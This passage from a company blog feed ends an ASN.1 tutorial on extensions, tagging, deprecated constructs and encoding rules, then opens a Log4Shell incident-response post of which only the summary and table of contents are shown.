integer values, so I've minimized the class a bit.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">PARAMETERS-BOUND ::= CLASS {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    --- a lot of other fields</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    &amp;minGenericNumberLength  INTEGER,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    &amp;maxGenericNumberLength  INTEGER,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    &amp;numOfGenericNumbers     INTEGER,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">WITH SYNTAX {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    --- a lot of other fields</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    MINIMUM-FOR-GENERIC-NUMBER  &amp;minGenericNumberLength</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    MAXIMUM-FOR-GENERIC-NUMBER  &amp;maxGenericNumberLength</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    NUM-OF-GENERIC-NUMBERS      &amp;numOfGenericNumbers</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>One could then specify different values using the <code>PARAMETERS-BOUND</code>
class to reuse the <code>GenericNumber</code> and <code>GenericNumbers</code> types.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">cAPSpecificBoundSet PARAMETERS-BOUND ::= {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    --- again, lots of other values</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    MINIMUM-FOR-GENERIC-NUMBER                  3</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    MAXIMUM-FOR-GENERIC-NUMBER                  11</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    NUM-OF-GENERIC-NUMBERS                      5</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>If one would pass <code>cAPSpecificBoundSet</code> to a value of type
<code>GenericNumbers</code>, it would define an instance which holds 1-5
<code>GenericNumber</code>s of 3-11 octets.</p><p>Quite powerful if you have multiple definitions which uses similar
structure.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="extensions">Extensions<a class="hash-link" href="#extensions" title="Direct link to heading">​</a></h2><p>Sometimes you will need to support different versions of a protocol
(or someone else need to support different version, and you just need
to read the types of the protocol), and maybe the new version need to
extend some types in order to include more information. Then without
redefining everything and copy the previous version of the type to the
new version of the type one can use extension markers (syntax <code>...</code>).</p><p>Take the <code>QosMonitoringRequest</code> type below as an example. In the first
version of the protocol (NGAP if you really want to know), the
<code>QoSMonitoringRequest</code> could take only enums <code>ul</code>, <code>dl</code>, or <code>both</code>.
However, in a subsequent version it was extended with a new enum
<code>stop</code>. With the extension marker <code>...</code> the v1-compilers can handle
the first three enums, and the v2-compilers can handle all enums from
v1 but also the <code>stop</code> enum.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">QosMonitoringRequest ::= ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ul,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    dl,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    both,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ...</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">} -- version 1</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">QosMonitoringRequest ::= ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ul,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    dl,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    both,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ...,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    stop</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">} -- version 2</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>For enums, if there is yet a newer version, say version 3 of this type
one, you should just add the new enum under the previous enums.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">QosMonitoringRequest ::= ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ul,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    dl,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    both,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ...,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    stop,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    half</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">} -- imaginary version 3</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>For <code>SEQUENCE</code>, <code>SET</code> and <code>CHOICE</code> one could either do the same, or to
keep the versions separated, add another extension mark with the new
fields in between. One could also add version brackets to group the
extensions and highlight the differences.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">Ax ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    a INTEGER (250..253),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    b BOOLEAN,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    c CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        d INTEGER, -- version 1</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        ...,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        [[</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            e BOOLEAN,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            f IA5String</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        ]],</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        ... -- version 2</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ..., -- version 1</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    [[</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        g NumericString (SIZE(3)),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        h BOOLEAN OPTIONAL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ]],</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ..., -- version 2</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    i BMPString OPTIONAL,  -- version 3</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    j PrintableString OPTIONAL -- version 3</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Only the types <code>ENUMERATED</code>, <code>SEQUENCE</code>, <code>SET</code> and <code>CHOICE</code>, as well
as subtype constraints, and object and value sets can be extended.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="automatic-implicit-explicit-tags">Automatic, Implicit, Explicit tags<a class="hash-link" href="#automatic-implicit-explicit-tags" title="Direct link to heading">​</a></h2><p>When an value is transmitted all ambiguities need to be removed. That
is why every type needs to have an unique identifier, called a tag.</p><p>The section <a href="#default-and-optional-keywords">DEFAULT and OPTIONAL
keywords</a> has a good example I will
explain.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CollectedDigits ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  minimumNbOfDigits    [0] INTEGER (1..16) DEFAULT 1,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  maximumNbOfDigits    [1] INTEGER (1..16),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  endOfReplyDigit      [2] OCTET STRING (SIZE (1..2)) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  cancelDigit          [3] OCTET STRING (SIZE (1..2)) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  startDigit           [4] OCTET STRING (SIZE (1..2)) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  firstDigitTimeOut    [5] INTEGER (1..127) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  interDigitTimeOut    [6] INTEGER (1..127) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  errorTreatment       [7] ErrorTreatment DEFAULT stdErrorAndInfo,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  interruptableAnnInd  [8] BOOLEAN DEFAULT TRUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  voiceInformation     [9] BOOLEAN DEFAULT FALSE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  voiceBack            [10] BOOLEAN DEFAULT FALSE</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>In this sequence we can see that many of the values are optional and
some have defaults, only the value <code>maximumNbOfDigits</code> is mandatory.</p><p>When the sending side transmits a value of <code>CollectedDigits</code> type, the
receiving side will get a sequence of the values mentioned. With
BER-encoding each defined value will have an identifier, a length (of
the value transmitted) and the value. This is called a
Tag-Length-Value or TLV for short.</p><p>All basic types already has an universal tag as stated in the <a href="#types">types
table</a>, but the composite types does not. (If not tagged, how
would it see the difference between <code>endOfReplyDigit</code>, <code>cancelDigit</code>
and <code>startDigit</code> in the example above?)</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">RoutingInformation ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  reroutingNumber    [0] IMPLICIT IsdnNumber,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  forwardedToNumber  [1] IMPLICIT IsdnNumber</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">IsdnNumber ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  typeOfAddress  TypeOfAddress,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  digits         TelephonyString</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">TypeOfAddress ::= ENUMERATED {national(0), international(1), private(2)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">TelephonyString ::=</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  IA5String</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    (FROM ("0" | "1" | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9" | "*" |</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">           "#"))(SIZE (1..15))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>A value of <code>RoutingInformation</code> in this example will with BER encoding
only transmit the tag <code>[0]</code> or <code>[1]</code> (and of course the length and
value). It counts on that the receiving part has the same version of
the ASN.1 and knows the abstract syntax. If it wouldn't have been
<code>IMPLICIT</code>, then it would have sent either tags <code>[0]</code> or <code>[1]</code>
followed by the tags for <code>TypeOfAddress</code> (ENUMERATED) <code>[10]</code>, and tags
for <code>TelephonyString</code> (IA5String) <code>[4]</code>.</p><p>One can specify <code>IMPLICIT</code> and <code>EXPLICIT</code> tagging on module basis,
where the <code>DEFINITIONS</code> are assigned.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS IMPLICIT TAGS ::= BEGIN</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Instead of writing all the tags self (explicitly in both cases), one
can instead use the keywords <code>AUTOMATED TAGS</code>.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS AUTOMATIC TAGS ::= BEGIN</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>This will add tags to the composit types that doesn't have them
(explicitly) set.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="deprecations-and-discouragements">Deprecations and discouragements<a class="hash-link" href="#deprecations-and-discouragements" title="Direct link to heading">​</a></h2><p>Some things have been deprecated from earlier ASN.1 specifications,
and use of these are strongly discouraged.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="any">ANY<a class="hash-link" href="#any" title="Direct link to heading">​</a></h3><p>First out is the <code>ANY</code> type, which could take the form of any
value. It's like an unrestricted <code>CHOICE</code> type.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">Invoke ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    invokeID           InvokeIdType,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    linkedID       [0] InvokeIdType OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    operationCode      MAP-OPERATION,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    parameter          InvokeParameter OPTIONAL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">InvokeParameter ::= ANY</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Problem with this is that the ASN.1 compiler does not have a formal
way of knowing which values are approved. The use of <code>ANY</code> also
usually meant it was coupled with some other value, for instance the
<code>operationCode</code> in the example above.</p><p>To make this link one could have used <code>DEFINED BY</code> specifying which
field the <code>ANY</code> type is coupled with. The drawback with this solution
is that it still has an ambiguous meaning, and the types are of no use
for the application designer.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">ExtensionField ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    type        INTEGER,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    --  shall identify the value of an EXTENSION type</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    criticality ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        ignore(0),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        abort(1)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    } DEFAULT ignore,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    value   [1] ANY DEFINED BY type</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>Instead the concept of informal object classes and parameterized
components were introduced.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="macros">Macros<a class="hash-link" href="#macros" title="Direct link to heading">​</a></h3><p>Macros were removed because they were poorly documented and too
general. Because of this they were hard to implement and automate in
the compilers. They follow the BNF notation.</p><div class="codeBlockContainer_I0IT language-asn.1 theme-code-block"><div class="codeBlockContent_wNvx asn.1"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_jd64 thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#bfc7d5"><span class="token plain">OPERATION MACRO ::=</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">BEGIN</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    TYPE NOTATION ::= Parameter Result Errors LinkedOperations</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    VALUE NOTATION ::= value (VALUE CHOICE { localValue INTEGER, globalValue OBJECT IDENTIFIER } )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Parameter ::= ArgKeyword NamedType | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ArgKeyword ::= "ARGUMENT" | "PARAMETER"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Result ::= "RESULT" ResultType | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Errors ::= "ERRORS" "{"ErrorNames"}" | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    LinkedOperations ::= "LINKED" "{"LinkedOperationNames"}" | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ResultType ::= NamedType | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ErrorNames ::= ErrorList | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ErrorList ::= Error | ErrorList "," Error</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Error ::= value (ERROR)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">             -- shall reference an error value</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">             | type</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">             -- shall reference an error type</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">             -- if no error value is specified</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    LinkedOperationNames ::= OperationList | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    OperationList ::= Operation | OperationList "," Operation</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Operation ::= value (OPERATION)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                  -- shall reference an operation value</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                  | type</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                  -- shall reference an operation type if</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                  -- no operation value is specified</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    NamedType ::= identifier type | type</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">END</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_wuS7 clean-btn">Copy</button></div></div><p>The two needed fields of the macro are <code>TYPE NOTATION</code> and <code>VALUE
NOTATION</code>. The rest of the fields are the value sequence defining what
the macro should insert. Quotes define the string to insert (excluding
the actual quotes), <code>empty</code> inserts nothing. <code>identifier</code>, <code>value</code>, or
<code>type</code> are used to infer different things. Dubuisson has (yet again) a
good chapter on this topic.</p><p>Also here one should use informal object classes and parameterized
components instead of using macros.</p><h1>Encodings</h1><p>There are numerous codecs when transmitting the abstract syntax, all
with different pros and cons.</p><table><thead><tr><th>Short name</th><th>Long name</th></tr></thead><tbody><tr><td>BER</td><td>Basic encoding rules</td></tr><tr><td>DER</td><td>Distinguished encoding rules</td></tr><tr><td>CER</td><td>Canonical encoding rules</td></tr><tr><td>PER</td><td>Packed encoding rules</td></tr><tr><td>OER</td><td>Octet encoding rules</td></tr><tr><td>XER</td><td>XML encoding rules</td></tr><tr><td>EXER</td><td>Extended XML encoding rules</td></tr><tr><td>JER</td><td>JSON encoding rules</td></tr></tbody></table><p>BER is the oldest encoding rule for ASN.1. It uses Tag-Length-Value
format where all tags, lengths and values are multiples of
octets. Because this was the first encoding rule it was named <code>basic</code>
to indicate that there might be more standardized encoding rules in
the future.</p><p>DER and CER are subsets of BER, which was added for developers of
X.400 email and X.500 directory applications. It provides means to
make sure bit strings are not altered during transfer. The main
difference between DER and CER is that DER uses a definite-length
format and CER an indefinite-length format, so CER is best used for
applications that transfer a big amount of data.</p><p>PER is the most compact format, and used for bandwith conservation. It
does not send the Tag of the TLV because the order in which components
of the message occur is known.  PER also does not send the Length of
the TLV if the Value has a fixed length. It uses information from
ASN.1 message description to eliminate redundant information from the
Value portion. It can either be aligned to multiple of octets by
padding each value with '0's, or unaligned (U-PER/Unaligned PER) which
is more compact but take more time to decode.</p><p>OER was adapted from PER and uses an octet oriented format, so the
length of all specified Tags, Lengths, and Values are padded to be
multiples of 8 bits octets as in BER. OER is usually faster than both
BER and PER with regards to encoding and decoding.</p><p>XER, CXER and EXER are used for transmitting XML format. CXER is used
for transmitting data canonically, e.g. used by security applications.
EXER or Extended XER is used when "stylish" features is wanted, and
adds possibility to extend the encoder for instance when wanting to
insert processing instructions or comments into the XML.</p><p>JER is used when transmitting JSON in accordance to the format
specified in
<a href="https://www.ecma-international.org/publications-and-standards/standards/ecma-404/" target="_blank" rel="noopener noreferrer">ECMA-404</a>.</p><p>There are probably a bunch of others as well, but these are the ones
that have a specification.</p><table><thead><tr><th>ITU-T number</th><th>Name</th></tr></thead><tbody><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.690" target="_blank" rel="noopener noreferrer">X.690</a></td><td>ASN.1 encoding rules: Specification of Basic Encoding Rules (BER), Canonical Encoding Rules (CER) and Distinguished Encoding Rules (DER)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.691" target="_blank" rel="noopener noreferrer">X.691</a></td><td>ASN.1 encoding rules: Specification of Packed Encoding Rules (PER)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.692" target="_blank" rel="noopener noreferrer">X.692</a></td><td>ASN.1 encoding rules: Specification of Encoding Control Notation (ECN)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.693" target="_blank" rel="noopener noreferrer">X.693</a></td><td>ASN.1 encoding rules: XML Encoding Rules (XER)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.694" target="_blank" rel="noopener noreferrer">X.694</a></td><td>ASN.1 encoding rules: Mapping W3C XML schema definitions into ASN.1</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.695" target="_blank" rel="noopener noreferrer">X.695</a></td><td>ASN.1 encoding rules: Registration and application of PER encoding instructions</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.696" target="_blank" rel="noopener noreferrer">X.696</a></td><td>ASN.1 encoding rules: Specification of Octet Encoding Rules (OER)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.697" target="_blank" rel="noopener noreferrer">X.697</a></td><td>ASN.1 encoding rules: Specification of JavaScript Object Notation Encoding Rules (JER)</td></tr></tbody></table><h1>Final words</h1><p>Congratulations for making through this blog post. You deserve a
medal, and I hope this can help you understand the complexity and
greatness of ASN.1.</p><p>We have gone through the <strong>basics</strong> of ASN.1, there are still a lot of
things to be uncovered. You now understand the most common basic and
structured types, as well as the main differences between the
different encodings.</p><p>If I write a part 2 I will take you through the Diameter specs
instead, which are much more straighforward.</p><p>Image from <a href="https://xkcd.com" target="_blank" rel="noopener noreferrer">xkcd</a> describing how I feel with ASN.1:</p><a href="https://xkcd.com/208/" target="_blank" rel="noopener noreferrer" class="image"><img src="https://imgs.xkcd.com/comics/regular_expressions.png"></a>]]></content>
        <author>
            <name>Sebastian Weddmark Olsson</name>
            <uri>https://www.linkedin.com/in/sebastian-weddmark-olsson/</uri>
        </author>
        <category label="telco" term="telco"/>
        <category label="ASN.1" term="ASN.1"/>
        <category label="dia" term="dia"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Zero-day vulnerabilities - Log4j]]></title>
        <id>log4j-security-vulnerability</id>
        <link href="https://www.wgtwo.com/blog/log4j-security-vulnerability"/>
        <updated>2021-12-17T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[On Friday, December 10th, wgtwo and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.]]></summary>
        <content type="html"><![CDATA[<p>On Friday, December 10th, <strong>wgtwo</strong> and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.</p><h1>Table of Contents</h1><p><a href="#friday">Friday</a></p><ul><li><a href="#code">Code</a></li><li><a href="#docker-vulnerability-scan-day-1">Docker Vulnerability Scan Day 1</a></li></ul><p><a href="#saturday">Saturday</a></p><ul><li><a href="#checking-our-infrastructure-ourselves-with-DNS-requests">Checking our infrastructure ourselves with DNS requests</a></li><li><a href="#log-analysis-and-alerting">Log Analysis and Alerting</a></li></ul><p><a href="#monday">Monday</a></p><ul><li><a href="#docker-vulnerability-scans">Docker Vulnerability Scans</a></li><li><a href="#monitoring-vendors">Monitoring vendors</a></li></ul><p><a href="#what-worked-well-and-could-be-improved">What worked well and could be improved</a>
<a href="#staying-secure">Staying secure</a>
